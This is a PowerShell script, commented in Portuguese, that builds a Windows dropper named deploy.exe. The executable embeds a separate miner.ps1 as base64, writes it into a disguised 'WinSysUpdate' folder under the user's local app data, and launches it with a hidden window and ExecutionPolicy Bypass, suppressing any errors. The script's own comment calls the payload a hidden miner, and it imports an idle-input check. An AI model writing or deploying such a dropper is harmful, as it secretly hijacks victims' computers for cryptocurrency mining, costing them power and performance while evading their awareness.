# Este script gera o deploy.exe nativo que instala e executa o minerador oculto.

$win32Code = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [StructLayout(LayoutKind.Sequential)]
    public struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }
}
'@

# Lendo o conteúdo atualizado do miner.ps1
$minerPs1Content = Get-Content -Path (Join-Path $PSScriptRoot "miner.ps1") -Raw

$minerPs1Base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($minerPs1Content))

$csharpCode = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Text;

public class Program {
    public static void Main() {
        try {
            string tempDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSysUpdate");
            if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
            
            string psFile = Path.Combine(tempDir, "miner.ps1");
            string minerCode = Encoding.UTF8.GetString(Convert.FromBase64String("$minerPs1Base64"));
            File.WriteAllText(psFile, minerCode);
            
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + psFile + "\"";
            psi.CreateNoWindow = true;
            psi.UseShellExecute = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            
            Process.Start(psi);
        } catch (Exception) {
            // Silently fail
        }
    }
}
"@

# Compilando o executável
Add-Type -TypeDefinition $csharpCode -OutputAssembly (Join-Path $PSScriptRoot "deploy.exe") -OutputType WindowsApplication
Write-Host "deploy.exe gerado com sucesso com as novas configurações do Ntfy!" -ForegroundColor Green
